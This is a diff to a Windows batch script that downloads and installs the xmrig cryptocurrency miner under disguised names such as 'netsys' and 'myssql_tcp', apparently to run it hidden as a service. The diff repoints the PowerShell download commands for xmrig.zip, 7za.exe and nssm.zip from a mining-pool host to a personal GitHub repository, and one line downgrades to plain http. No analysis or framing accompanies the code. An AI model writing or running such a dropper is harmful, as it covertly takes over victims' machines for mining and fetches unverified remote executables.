@@ -202,7 +202,7 @@ rmdir /q /s "%USERPROFILE%\netsys" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\netsys" GOTO REMOVE_DIR0
 
 echo [*] Downloading netsys advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://download.c3pool.org/xmrig_setup/raw/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/teshushu/BiBi/raw/main/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download myssqltcp advanced version of xmrig
   goto MINER_BAD
@@ -212,7 +212,7 @@ echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\netsys"
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\myssqltcp')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/teshushu/BiBi/raw/main/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
@@ -256,7 +256,7 @@ echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\netsys"
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\myssqltcp')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/teshushu/BiBi/raw/main/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
@@ -348,7 +348,7 @@ goto OK
 :ADMIN_MINER_SETUP
 
 echo [*] Downloading tools to make myssql_tcp service to "%USERPROFILE%\nssm.zip"
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://download.c3pool.org/xmrig_setup/raw/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/teshushu/BiBi/raw/main/nssm.zip', '%USERPROFILE%\nssm.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download tools to make myssql_tcp service
   exit /b 1
@@ -358,7 +358,7 @@ echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\netsys"
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\myssqltcp')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
